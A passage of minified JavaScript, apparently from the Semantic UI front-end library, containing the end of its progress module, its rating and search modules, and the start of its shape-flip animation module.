                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(r, n) : void 0 !== a && (s = a), e.isArray(i) ? i.push(s) : void 0 !== i ? i = [i, s] : void 0 !== s && (i = s), a } }, u ? (void 0 === C && d.initialize(), d.invoke(c)) : (void 0 !== C && C.invoke("destroy"), d.initialize()) }), void 0 !== i ? i : this }, e.fn.progress.settings = { name: "Progress", namespace: "progress", silent: !1, debug: !1, verbose: !1, performance: !0, random: { min: 2, max: 5 }, duration: 300, updateInterval: "auto", autoSuccess: !0, showActivity: !0, limitValues: !0, label: "percent", precision: 0, framerate: 1e3 / 30, percent: !1, total: !1, value: !1, failSafeDelay: 100, onLabelUpdate: function(e, t, n, i) { return t }, onChange: function(e, t, n) {}, onSuccess: function(e) {}, onActive: function(e, t) {}, onError: function(e, t) {}, onWarning: function(e, t) {}, error: { method: "The method you called is not defined.", nonNumeric: "Progress value is non numeric", tooHigh: "Value specified is above 100%", tooLow: "Value specified is below 0%" }, regExp: { variable: /\{\$*[A-z0-9]+\}/g }, metadata: { percent: "percent", total: "total", value: "value" }, selector: { bar: "> .bar", label: "> .label", progress: ".bar > .progress" }, text: { active: !1, error: !1, success: !1, warning: !1, percent: "{percent}%", ratio: "{value} of {total}" }, className: { active: "active", error: "error", success: "success", warning: "warning" } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.rating = function(t) { var n, i = e(this),
                    r = i.selector || "",
                    o = (new Date).getTime(),
                    a = [],
                    s = arguments[0],
                    c = "string" == typeof s,
                    u = [].slice.call(arguments, 1); return i.each(function() { var l, d, f = e.isPlainObject(t) ? e.extend(!0, {}, e.fn.rating.settings, t) : e.extend({}, e.fn.rating.settings),
                        h = f.namespace,
                        p = f.className,
                        b = f.metadata,
                        m = f.selector,
                        g = (f.error, "." + h),
                        v = "module-" + h,
                        y = this,
                        w = e(this).data(v),
                        x = e(this),
                        S = x.find(m.icon);
                    d = { initialize: function() { d.verbose("Initializing rating module", f), 0 === S.length && d.setup.layout(), f.interactive ? d.enable() : d.disable(), d.set.initialLoad(), d.set.rating(d.get.initialRating()), d.remove.initialLoad(), d.instantiate() }, instantiate: function() { d.verbose("Instantiating module", f), w = d, x.data(v, d) }, destroy: function() { d.verbose("Destroying previous instance", w), d.remove.events(), x.removeData(v) }, refresh: function() { S = x.find(m.icon) }, setup: { layout: function() { var t = d.get.maxRating(),
                                    n = e.fn.rating.settings.templates.icon(t);
                                d.debug("Generating icon html dynamically"), x.html(n), d.refresh() } }, event: { mouseenter: function() { var t = e(this);
                                t.nextAll().removeClass(p.selected), x.addClass(p.selected), t.addClass(p.selected).prevAll().addClass(p.selected) }, mouseleave: function() { x.removeClass(p.selected), S.removeClass(p.selected) }, click: function() { var t = e(this),
                                    n = d.get.rating(),
                                    i = S.index(t) + 1;
                                ("auto" == f.clearable ? 1 === S.length : f.clearable) && n == i ? d.clearRating() : d.set.rating(i) } }, clearRating: function() { d.debug("Clearing current rating"), d.set.rating(0) }, bind: { events: function() { d.verbose("Binding events"), x.on("mouseenter" + g, m.icon, d.event.mouseenter).on("mouseleave" + g, m.icon, d.event.mouseleave).on("click" + g, m.icon, d.event.click) } }, remove: { events: function() { d.verbose("Removing events"), x.off(g) }, initialLoad: function() { l = !1 } }, enable: function() { d.debug("Setting rating to interactive mode"), d.bind.events(), x.removeClass(p.disabled) }, disable: function() { d.debug("Setting rating to read-only mode"), d.remove.events(), x.addClass(p.disabled) }, is: { initialLoad: function() { return l } }, get: { initialRating: function() { return void 0 !== x.data(b.rating) ? (x.removeData(b.rating), x.data(b.rating)) : f.initialRating }, maxRating: function() { return void 0 !== x.data(b.maxRating) ? (x.removeData(b.maxRating), x.data(b.maxRating)) : f.maxRating }, rating: function() { var e = S.filter("." + p.active).length; return d.verbose("Current rating retrieved", e), e } }, set: { rating: function(e) { var t = e - 1 >= 0 ? e - 1 : 0,
                                    n = S.eq(t);
                                x.removeClass(p.selected), S.removeClass(p.selected).removeClass(p.active), e > 0 && (d.verbose("Setting current rating to", e), n.prevAll().addBack().addClass(p.active)), d.is.initialLoad() || f.onRate.call(y, e) }, initialLoad: function() { l = !0 } }, setting: function(t, n) { if (d.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, f, t);
                            else { if (void 0 === n) return f[t];
                                e.isPlainObject(f[t]) ? e.extend(!0, f[t], n) : f[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, d, t);
                            else { if (void 0 === n) return d[t];
                                d[t] = n } }, debug: function() {!f.silent && f.debug && (f.performance ? d.performance.log(arguments) : (d.debug = Function.prototype.bind.call(console.info, console, f.name + ":"), d.debug.apply(console, arguments))) }, verbose: function() {!f.silent && f.verbose && f.debug && (f.performance ? d.performance.log(arguments) : (d.verbose = Function.prototype.bind.call(console.info, console, f.name + ":"), d.verbose.apply(console, arguments))) }, error: function() { f.silent || (d.error = Function.prototype.bind.call(console.error, console, f.name + ":"), d.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                f.performance && (t = (new Date).getTime(), i = o || t, n = t - i, o = t, a.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: y, "Execution Time": n })), clearTimeout(d.performance.timer), d.performance.timer = setTimeout(d.performance.display, 500) }, display: function() { var t = f.name + ":",
                                    n = 0;
                                o = !1, clearTimeout(d.performance.timer), e.each(a, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", r && (t += " '" + r + "'"), i.length > 1 && (t += " (" + i.length + ")"), (void 0 !== console.group || void 0 !== console.table) && a.length > 0 && (console.groupCollapsed(t), console.table ? console.table(a) : e.each(a, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), a = [] } }, invoke: function(t, i, r) { var o, a, s, c = w; return i = i || u, r = y || r, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] && (a = c[i], !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(r, i) : void 0 !== a && (s = a), e.isArray(n) ? n.push(s) : void 0 !== n ? n = [n, s] : void 0 !== s && (n = s), a } }, c ? (void 0 === w && d.initialize(), d.invoke(s)) : (void 0 !== w && w.invoke("destroy"), d.initialize()) }), void 0 !== n ? n : this }, e.fn.rating.settings = { name: "Rating", namespace: "rating", slent: !1, debug: !1, verbose: !1, performance: !0, initialRating: 0, interactive: !0, maxRating: 4, clearable: "auto", fireOnInit: !1, onRate: function(e) {}, error: { method: "The method you called is not defined", noMaximum: "No maximum rating specified. Cannot generate HTML automatically" }, metadata: { rating: "rating", maxRating: "maxRating" }, className: { active: "active", disabled: "disabled", selected: "selected", loading: "loading" }, selector: { icon: ".icon" }, templates: { icon: function(e) { for (var t = 1, n = ""; t <= e;) n += '<i class="icon"></i>', t++; return n } } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.search = function(i) { var r, o = e(this),
                    a = o.selector || "",
                    s = (new Date).getTime(),
                    c = [],
                    u = arguments[0],
                    l = "string" == typeof u,
                    d = [].slice.call(arguments, 1); return e(this).each(function() { var f, h = e.isPlainObject(i) ? e.extend(!0, {}, e.fn.search.settings, i) : e.extend({}, e.fn.search.settings),
                        p = h.className,
                        b = h.metadata,
                        m = h.regExp,
                        g = h.fields,
                        v = h.selector,
                        y = h.error,
                        w = h.namespace,
                        x = "." + w,
                        S = w + "-module",
                        _ = e(this),
                        k = _.find(v.prompt),
                        C = _.find(v.searchButton),
                        A = _.find(v.results),
                        E = _.find(v.result),
                        T = _.find(v.category),
                        M = this,
                        R = _.data(S),
                        P = !1,
                        I = !1;
                    f = { initialize: function() { f.verbose("Initializing module"), f.determine.searchFields(), f.bind.events(), f.set.type(), f.create.results(), f.instantiate() }, instantiate: function() { f.verbose("Storing instance of module", f), R = f, _.data(S, f) }, destroy: function() { f.verbose("Destroying instance"), _.off(x).removeData(S) }, refresh: function() { f.debug("Refreshing selector cache"), k = _.find(v.prompt), C = _.find(v.searchButton), T = _.find(v.category), A = _.find(v.results), E = _.find(v.result) }, refreshResults: function() { A = _.find(v.results), E = _.find(v.result) }, bind: { events: function() { f.verbose("Binding events to search"), h.automatic && (_.on(f.get.inputEvent() + x, v.prompt, f.event.input), k.attr("autocomplete", "off")), _.on("focus" + x, v.prompt, f.event.focus).on("blur" + x, v.prompt, f.event.blur).on("keydown" + x, v.prompt, f.handleKeyboard).on("click" + x, v.searchButton, f.query).on("mousedown" + x, v.results, f.event.result.mousedown).on("mouseup" + x, v.results, f.event.result.mouseup).on("click" + x, v.result, f.event.result.click) } }, determine: { searchFields: function() { i && void 0 !== i.searchFields && (h.searchFields = i.searchFields) } }, event: { input: function() { h.searchDelay ? (clearTimeout(f.timer), f.timer = setTimeout(function() { f.is.focused() && f.query() }, h.searchDelay)) : f.query() }, focus: function() { f.set.focus(), h.searchOnFocus && f.has.minimumCharacters() && f.query(function() { f.can.show() && f.showResults() }) }, blur: function(e) { var t = n.activeElement === this,
                                    i = function() { f.cancel.query(), f.remove.focus(), f.timer = setTimeout(f.hideResults, h.hideDelay) };
                                t || (I = !1, f.resultsClicked ? (f.debug("Determining if user action caused search to close"), _.one("click.close" + x, v.results, function(e) { if (f.is.inMessage(e) || P) return void k.focus();
                                    P = !1, f.is.animating() || f.is.hidden() || i() })) : (f.debug("Input blurred without user action, closing results"), i())) }, result: { mousedown: function() { f.resultsClicked = !0 }, mouseup: function() { f.resultsClicked = !1 }, click: function(n) { f.debug("Search result selected"); var i = e(this),
                                        r = i.find(v.title).eq(0),
                                        o = i.is("a[href]") ? i : i.find("a[href]").eq(0),
                                        a = o.attr("href") || !1,
                                        s = o.attr("target") || !1,
                                        c = (r.html(), r.length > 0 && r.text()),
                                        u = f.get.results(),
                                        l = i.data(b.result) || f.get.result(c, u); if (e.isFunction(h.onSelect) && !1 === h.onSelect.call(M, l, u)) return f.debug("Custom onSelect callback cancelled default select action"), void(P = !0);
                                    f.hideResults(), c && f.set.value(c), a && (f.verbose("Opening search link found in result", o), "_blank" == s || n.ctrlKey ? t.open(a) : t.location.href = a) } } }, handleKeyboard: function(e) { var t, n = _.find(v.result),
                                i = _.find(v.category),
                                r = n.filter("." + p.active),
                                o = n.index(r),
                                a = n.length,
                                s = r.length > 0,
                                c = e.which,
                                u = { backspace: 8, enter: 13, escape: 27, upArrow: 38, downArrow: 40 }; if (c == u.escape && (f.verbose("Escape key pressed, blurring search field"), f.hideResults(), I = !0), f.is.visible())
                                if (c == u.enter) { if (f.verbose("Enter key pressed, selecting active result"), n.filter("." + p.active).length > 0) return f.event.result.click.call(n.filter("." + p.active), e), e.preventDefault(), !1 } else c == u.upArrow && s ? (f.verbose("Up key pressed, changing active result"), t = o - 1 < 0 ? o : o - 1, i.removeClass(p.active), n.removeClass(p.active).eq(t).addClass(p.active).closest(i).addClass(p.active), e.preventDefault()) : c == u.downArrow && (f.verbose("Down key pressed, changing active result"), t = o + 1 >= a ? o : o + 1, i.removeClass(p.active), n.removeClass(p.active).eq(t).addClass(p.active).closest(i).addClass(p.active), e.preventDefault());
                            else c == u.enter && (f.verbose("Enter key pressed, executing query"), f.query(), f.set.buttonPressed(), k.one("keyup", f.remove.buttonFocus)) }, setup: { api: function(t, n) { var i = { debug: h.debug, on: !1, cache: !0, action: "search", urlData: { query: t }, onSuccess: function(e) { f.parse.response.call(M, e, t), n() }, onFailure: function() { f.displayMessage(y.serverError), n() }, onAbort: function(e) {}, onError: f.error };
                                e.extend(!0, i, h.apiSettings), f.verbose("Setting up API request", i), _.api(i) } }, can: { useAPI: function() { return void 0 !== e.fn.api }, show: function() { return f.is.focused() && !f.is.visible() && !f.is.empty() }, transition: function() { return h.transition && void 0 !== e.fn.transition && _.transition("is supported") } }, is: { animating: function() { return A.hasClass(p.animating) }, hidden: function() { return A.hasClass(p.hidden) }, inMessage: function(t) { if (t.target) { var i = e(t.target); return e.contains(n.documentElement, t.target) && i.closest(v.message).length > 0 } }, empty: function() { return "" === A.html() }, visible: function() { return A.filter(":visible").length > 0 }, focused: function() { return k.filter(":focus").length > 0 } }, get: { inputEvent: function() { var e = k[0]; return void 0 !== e && void 0 !== e.oninput ? "input" : void 0 !== e && void 0 !== e.onpropertychange ? "propertychange" : "keyup" }, value: function() { return k.val() }, results: function() { return _.data(b.results) }, result: function(t, n) { var i = ["title", "id"],
                                    r = !1; return t = void 0 !== t ? t : f.get.value(), n = void 0 !== n ? n : f.get.results(), "category" === h.type ? (f.debug("Finding result that matches", t), e.each(n, function(n, o) { if (e.isArray(o.results) && (r = f.search.object(t, o.results, i)[0])) return !1 })) : (f.debug("Finding result in results object", t), r = f.search.object(t, n, i)[0]), r || !1 } }, select: { firstResult: function() { f.verbose("Selecting first result"), E.first().addClass(p.active) } }, set: { focus: function() { _.addClass(p.focus) }, loading: function() { _.addClass(p.loading) }, value: function(e) { f.verbose("Setting search input value", e), k.val(e) }, type: function(e) { e = e || h.type, "category" == h.type && _.addClass(h.type) }, buttonPressed: function() { C.addClass(p.pressed) } }, remove: { loading: function() { _.removeClass(p.loading) }, focus: function() { _.removeClass(p.focus) }, buttonPressed: function() { C.removeClass(p.pressed) } }, query: function(t) { t = e.isFunction(t) ? t : function() {}; var n = f.get.value(),
                                i = f.read.cache(n);
                            t = t || function() {}, f.has.minimumCharacters() ? (i ? (f.debug("Reading result from cache", n), f.save.results(i.results), f.addResults(i.html), f.inject.id(i.results), t()) : (f.debug("Querying for", n), e.isPlainObject(h.source) || e.isArray(h.source) ? (f.search.local(n), t()) : f.can.useAPI() ? f.search.remote(n, t) : (f.error(y.source), t())), h.onSearchQuery.call(M, n)) : f.hideResults() }, search: { local: function(e) { var t, n = f.search.object(e, h.content);
                                f.set.loading(), f.save.results(n), f.debug("Returned local search results", n), t = f.generateResults({ results: n }), f.remove.loading(), f.addResults(t), f.inject.id(n), f.write.cache(e, { html: t, results: n }) }, remote: function(t, n) { n = e.isFunction(n) ? n : function() {}, _.api("is loading") && _.api("abort"), f.setup.api(t, n), _.api("query") }, object: function(t, n, i) { var r = [],
                                    o = [],
                                    a = t.toString().replace(m.escape, "\\$&"),
                                    s = new RegExp(m.beginsWith + a, "i"),
                                    c = function(t, n) { var i = -1 == e.inArray(n, r),
                                            a = -1 == e.inArray(n, o);
                                        i && a && t.push(n) }; return n = n || h.source, i = void 0 !== i ? i : h.searchFields, e.isArray(i) || (i = [i]), void 0 === n || !1 === n ? (f.error(y.source), []) : (e.each(i, function(i, a) { e.each(n, function(e, n) { "string" == typeof n[a] && (-1 !== n[a].search(s) ? c(r, n) : h.searchFullText && f.fuzzySearch(t, n[a]) && c(o, n)) }) }), e.merge(r, o)) } }, fuzzySearch: function(e, t) { var n = t.length,
                                i = e.length; if ("string" != typeof e) return !1; if (e = e.toLowerCase(), t = t.toLowerCase(), i > n) return !1; if (i === n) return e === t;
                            e: for (var r = 0, o = 0; r < i; r++) { for (var a = e.charCodeAt(r); o < n;)
                                    if (t.charCodeAt(o++) === a) continue e; return !1 }
                            return !0 }, parse: { response: function(e, t) { var n = f.generateResults(e);
                                f.verbose("Parsing server response", e), void 0 !== e && void 0 !== t && void 0 !== e[g.results] && (f.addResults(n), f.inject.id(e[g.results]), f.write.cache(t, { html: n, results: e[g.results] }), f.save.results(e[g.results])) } }, cancel: { query: function() { f.can.useAPI() && _.api("abort") } }, has: { minimumCharacters: function() { return f.get.value().length >= h.minCharacters }, results: function() { return 0 !== A.length && "" != A.html() } }, clear: { cache: function(e) { var t = _.data(b.cache);
                                e ? e && t && t[e] && (f.debug("Removing value from cache", e), delete t[e], _.data(b.cache, t)) : (f.debug("Clearing cache", e), _.removeData(b.cache)) } }, read: { cache: function(e) { var t = _.data(b.cache); return !!h.cache && (f.verbose("Checking cache for generated html for query", e), "object" == typeof t && void 0 !== t[e] && t[e]) } }, create: { id: function(e, t) { var n, i, r = e + 1; return void 0 !== t ? (n = String.fromCharCode(97 + t), i = n + r, f.verbose("Creating category result id", i)) : (i = r, f.verbose("Creating result id", i)), i }, results: function() { 0 === A.length && (A = e("<div />").addClass(p.results).appendTo(_)) } }, inject: { result: function(e, t, n) { f.verbose("Injecting result into results"); var i = void 0 !== n ? A.children().eq(n).children(v.result).eq(t) : A.children(v.result).eq(t);
                                f.verbose("Injecting results metadata", i), i.data(b.result, e) }, id: function(t) { f.debug("Injecting unique ids into results"); var n = 0,
                                    i = 0; return "category" === h.type ? e.each(t, function(t, r) { i = 0, e.each(r.results, function(e, t) { var o = r.results[e];
                                        void 0 === o.id && (o.id = f.create.id(i, n)), f.inject.result(o, i, n), i++ }), n++ }) : e.each(t, function(e, n) { var r = t[e];
                                    void 0 === r.id && (r.id = f.create.id(i)), f.inject.result(r, i), i++ }), t } }, save: { results: function(e) { f.verbose("Saving current search results to metadata", e), _.data(b.results, e) } }, write: { cache: function(e, t) { var n = void 0 !== _.data(b.cache) ? _.data(b.cache) : {};
                                h.cache && (f.verbose("Writing generated html to cache", e, t), n[e] = t, _.data(b.cache, n)) } }, addResults: function(t) { if (e.isFunction(h.onResultsAdd) && !1 === h.onResultsAdd.call(A, t)) return f.debug("onResultsAdd callback cancelled default action"), !1;
                            t ? (A.html(t), f.refreshResults(), h.selectFirstResult && f.select.firstResult(), f.showResults()) : f.hideResults(function() { A.empty() }) }, showResults: function(t) { t = e.isFunction(t) ? t : function() {}, I || !f.is.visible() && f.has.results() && (f.can.transition() ? (f.debug("Showing results with css animations"), A.transition({ animation: h.transition + " in", debug: h.debug, verbose: h.verbose, duration: h.duration, onComplete: function() { t() }, queue: !0 })) : (f.debug("Showing results with javascript"), A.stop().fadeIn(h.duration, h.easing)), h.onResultsOpen.call(A)) }, hideResults: function(t) { t = e.isFunction(t) ? t : function() {}, f.is.visible() && (f.can.transition() ? (f.debug("Hiding results with css animations"), A.transition({ animation: h.transition + " out", debug: h.debug, verbose: h.verbose, duration: h.duration, onComplete: function() { t() }, queue: !0 })) : (f.debug("Hiding results with javascript"), A.stop().fadeOut(h.duration, h.easing)), h.onResultsClose.call(A)) }, generateResults: function(t) { f.debug("Generating html from response", t); var n = h.templates[h.type],
                                i = e.isPlainObject(t[g.results]) && !e.isEmptyObject(t[g.results]),
                                r = e.isArray(t[g.results]) && t[g.results].length > 0,
                                o = ""; return i || r ? (h.maxResults > 0 && (i ? "standard" == h.type && f.error(y.maxResults) : t[g.results] = t[g.results].slice(0, h.maxResults)), e.isFunction(n) ? o = n(t, g) : f.error(y.noTemplate, !1)) : h.showNoResults && (o = f.displayMessage(y.noResults, "empty")), h.onResults.call(M, t), o }, displayMessage: function(e, t) { return t = t || "standard", f.debug("Displaying message", e, t), f.addResults(h.templates.message(e, t)), h.templates.message(e, t) }, setting: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, h, t);
                            else { if (void 0 === n) return h[t];
                                h[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, f, t);
                            else { if (void 0 === n) return f[t];
                                f[t] = n } }, debug: function() {!h.silent && h.debug && (h.performance ? f.performance.log(arguments) : (f.debug = Function.prototype.bind.call(console.info, console, h.name + ":"), f.debug.apply(console, arguments))) }, verbose: function() {!h.silent && h.verbose && h.debug && (h.performance ? f.performance.log(arguments) : (f.verbose = Function.prototype.bind.call(console.info, console, h.name + ":"), f.verbose.apply(console, arguments))) }, error: function() { h.silent || (f.error = Function.prototype.bind.call(console.error, console, h.name + ":"), f.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                h.performance && (t = (new Date).getTime(), i = s || t, n = t - i, s = t, c.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: M, "Execution Time": n })), clearTimeout(f.performance.timer), f.performance.timer = setTimeout(f.performance.display, 500) }, display: function() { var t = h.name + ":",
                                    n = 0;
                                s = !1, clearTimeout(f.performance.timer), e.each(c, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", a && (t += " '" + a + "'"), o.length > 1 && (t += " (" + o.length + ")"), (void 0 !== console.group || void 0 !== console.table) && c.length > 0 && (console.groupCollapsed(t), console.table ? console.table(c) : e.each(c, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), c = [] } }, invoke: function(t, n, i) { var o, a, s, c = R; return n = n || d, i = M || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] && (a = c[i], !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, l ? (void 0 === R && f.initialize(), f.invoke(u)) : (void 0 !== R && R.invoke("destroy"), f.initialize()) }), void 0 !== r ? r : this }, e.fn.search.settings = { name: "Search", namespace: "search", silent: !1, debug: !1, verbose: !1, performance: !0, type: "standard", minCharacters: 1, selectFirstResult: !1, apiSettings: !1, source: !1, searchOnFocus: !0, searchFields: ["title", "description"], displayField: "", searchFullText: !0, automatic: !0, hideDelay: 0, searchDelay: 200, maxResults: 7, cache: !0, showNoResults: !0, transition: "scale", duration: 200, easing: "easeOutExpo", onSelect: !1, onResultsAdd: !1, onSearchQuery: function(e) {}, onResults: function(e) {}, onResultsOpen: function() {}, onResultsClose: function() {}, className: { animating: "animating", active: "active", empty: "empty", focus: "focus", hidden: "hidden", loading: "loading", results: "results", pressed: "down" }, error: { source: "Cannot search. No source used, and Semantic API module was not included", noResults: "Your search returned no results", logging: "Error in debug logging, exiting.", noEndpoint: "No search endpoint was specified", noTemplate: "A valid template name was not specified.", serverError: "There was an issue querying the server.", maxResults: "Results must be an array to use maxResults setting", method: "The method you called is not defined." }, metadata: { cache: "cache", results: "results", result: "result" }, regExp: { escape: /[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, beginsWith: "(?:s|^)" }, fields: { categories: "results", categoryName: "name", categoryResults: "results", description: "description", image: "image", price: "price", results: "results", title: "title", url: "url", action: "action", actionText: "text", actionURL: "url" }, selector: { prompt: ".prompt", searchButton: ".search.button", results: ".results", message: ".results > .message", category: ".category", result: ".result", title: ".title, .name" }, templates: { escape: function(e) { var t = /[&<>"'`]/g,
                            n = /[&<>"'`]/,
                            i = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "`": "&#x60;" },
                            r = function(e) { return i[e] }; return n.test(e) ? e.replace(t, r) : e }, message: function(e, t) { var n = ""; return void 0 !== e && void 0 !== t && (n += '<div class="message ' + t + '">', n += "empty" == t ? '<div class="header">No Results</div class="header"><div class="description">' + e + '</div class="description">' : ' <div class="description">' + e + "</div>", n += "</div>"), n }, category: function(t, n) { var i = "";
                        e.fn.search.settings.templates.escape; return void 0 !== t[n.categoryResults] && (e.each(t[n.categoryResults], function(t, r) { void 0 !== r[n.results] && r.results.length > 0 && (i += '<div class="category">', void 0 !== r[n.categoryName] && (i += '<div class="name">' + r[n.categoryName] + "</div>"), e.each(r.results, function(e, t) { t[n.url] ? i += '<a class="result" href="' + t[n.url] + '">' : i += '<a class="result">', void 0 !== t[n.image] && (i += '<div class="image"> <img src="' + t[n.image] + '"></div>'), i += '<div class="content">', void 0 !== t[n.price] && (i += '<div class="price">' + t[n.price] + "</div>"), void 0 !== t[n.title] && (i += '<div class="title">' + t[n.title] + "</div>"), void 0 !== t[n.description] && (i += '<div class="description">' + t[n.description] + "</div>"), i += "</div>", i += "</a>" }), i += "</div>") }), t[n.action] && (i += '<a href="' + t[n.action][n.actionURL] + '" class="action">' + t[n.action][n.actionText] + "</a>"), i) }, standard: function(t, n) { var i = ""; return void 0 !== t[n.results] && (e.each(t[n.results], function(e, t) { t[n.url] ? i += '<a class="result" href="' + t[n.url] + '">' : i += '<a class="result">', void 0 !== t[n.image] && (i += '<div class="image"> <img src="' + t[n.image] + '"></div>'), i += '<div class="content">', void 0 !== t[n.price] && (i += '<div class="price">' + t[n.price] + "</div>"), void 0 !== t[n.title] && (i += '<div class="title">' + t[n.title] + "</div>"), void 0 !== t[n.description] && (i += '<div class="description">' + t[n.description] + "</div>"), i += "</div>", i += "</a>" }), t[n.action] && (i += '<a href="' + t[n.action][n.actionURL] + '" class="action">' + t[n.action][n.actionText] + "</a>"), i) } } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.shape = function(i) { var r, o = e(this),
                    a = (e("body"), (new Date).getTime()),
                    s = [],
                    c = arguments[0],
                    u = "string" == typeof c,
                    l = [].slice.call(arguments, 1),
                    d = t.requestAnimationFrame || t.mozRequestAnimationFrame || t.webkitRequestAnimationFrame || t.msRequestAnimationFrame || function(e) { setTimeout(e, 0) }; return o.each(function() { var t, f, h, p = o.selector || "",
                        b = e.isPlainObject(i) ? e.extend(!0, {}, e.fn.shape.settings, i) : e.extend({}, e.fn.shape.settings),
                        m = b.namespace,
                        g = b.selector,
                        v = b.error,
                        y = b.className,
                        w = "." + m,
                        x = "module-" + m,
                        S = e(this),
                        _ = S.find(g.sides),
                        k = S.find(g.side),
                        C = !1,
                        A = this,
                        E = S.data(x);
                    h = { initialize: function() { h.verbose("Initializing module for", A), h.set.defaultSide(), h.instantiate() }, instantiate: function() { h.verbose("Storing instance of module", h), E = h, S.data(x, E) }, destroy: function() { h.verbose("Destroying previous module for", A), S.removeData(x).off(w) }, refresh: function() { h.verbose("Refreshing selector cache for", A), S = e(A), _ = e(this).find(g.shape), k = e(this).find(g.side) }, repaint: function() { h.verbose("Forcing repaint event"); var e = _[0] || n.createElement("div");
                            e.offsetWidth }, animate: function(e, n) { h.verbose("Animating box with properties", e), n = n || function(e) { h.verbose("Executing animation callback"), void 0 !== e && e.stopPropagation(), h.reset(), h.set.active() }, b.beforeChange.call(f[0]), h.get.transitionEvent() ? (h.verbose("Starting CSS animation"), S.addClass(y.animating), _.css(e).one(h.get.transitionEvent(), n), h.set.duration(b.duration), d(function() { S.addClass(y.animating), t.addClass(y.hidden) })) : n() }, queue: function(e) { h.debug("Queueing animation of", e), _.one(h.get.transitionEvent(), function() { h.debug("Executing queued animation"), setTimeout(function() { S.shape(e) }, 0) }) }, reset: function() { h.verbose("Animating states reset"), S.removeClass(y.animating).attr("style", "").removeAttr("style"), _.attr("style", "").removeAttr("style"), k.attr("style", "").removeAttr("style").removeClass(y.hidden), f.removeClass(y.animating).attr("style", "").removeAttr("style") }, is: { complete: function() { return k.filter("." + y.active)[0] == f[0] }, animating: function() { return S.hasClass(y.animating) } }, set: { defaultSide: function() { t = S.find("." + b.className.active), f = t.next(g.side).length > 0 ? t.next(g.side) : S.find(g.side).first(), C = !1, h.verbose("Active side set to", t), h.verbose("Next side set to", f) }, duration: function(e) { e = e || b.duration, e = "number" == typeof e ? e + "ms" : e, h.verbose("Setting animation duration", e), (b.duration || 0 === b.duration) && _.add(k).css({ "-webkit-transition-duration": e, "-moz-transition-duration": e, "-ms-transition-duration": e, "-o-transition-duration": e, "transition-duration": e }) }, currentStageSize: function() { var e = S.find("." + b.className.active),
                                    t = e.outerWidth(!0),
                                    n = e.outerHeight(!0);
                                S.css({ width: t, height: n }) }, stageSize: function() { var e = S.clone().addClass(y.loading),
                                    t = e.find("." + b.className.active),
                                    n = C ? e.find(g.side).eq(C) : t.next(g.side).length > 0 ? t.next(g.side) : e.find(g.side).first(),
                                    i = "next" == b.width ? n.outerWidth(!0) : "initial" == b.width ? S.width() : b.width,
                                    r = "next" == b.height ? n.outerHeight(!0) : "initial" == b.height ? S.height() : b.height;
                                t.removeClass(y.active), n.addClass(y.active), e.insertAfter(S), e.remove(), "auto" != b.width && (S.css("width", i + b.jitter), h.verbose("Specifying width during animation", i)), "auto" != b.height && (S.css("height", r + b.jitter), h.verbose("Specifying height during animation", r)) }, nextSide: function(e) { C = e, f = k.filter(e), C = k.index(f), 0 === f.length && (h.set.defaultSide(), h.error(v.side)), h.verbose("Next side manually set to", f) }, active: function() { h.verbose("Setting new side to active", f), k.removeClass(y.active), f.addClass(y.active), b.onChange.call(f[0]), h.set.defaultSide() } }, flip: { up: function() { if (h.is.complete() && !h.is.animating() && !b.allowRepeats) return void h.debug("Side already visible", f); if (h.is.animating()) h.queue("flip up");
                                else { h.debug("Flipping up", f); var e = h.get.transform.up();
                                    h.set.stageSize(), h.stage.above(), h.animate(e) } }, down: function() { if (h.is.complete() && !h.is.animating() && !b.allowRepeats) return void h.debug("Side already visible", f); if (h.is.animating()) h.queue("flip down");
                                else { h.debug("Flipping down", f); var e = h.get.transform.down();
                                    h.set.stageSize(), h.stage.below(), h.animate(e) } }, left: function() { if (h.is.complete() && !h.is.animating() && !b.allowRepeats) return void h.debug("Side already visible", f); if (h.is.animating()) h.queue("flip left");
                                else { h.debug("Flipping left", f); var e = h.get.transform.left();
                                    h.set.stageSize(), h.stage.left(), h.animate(e) } }, right: function() { if (h.is.complete() && !h.is.animating() && !b.allowRepeats) return void h.debug("Side already visible", f); if (h.is.animating()) h.queue("flip right");
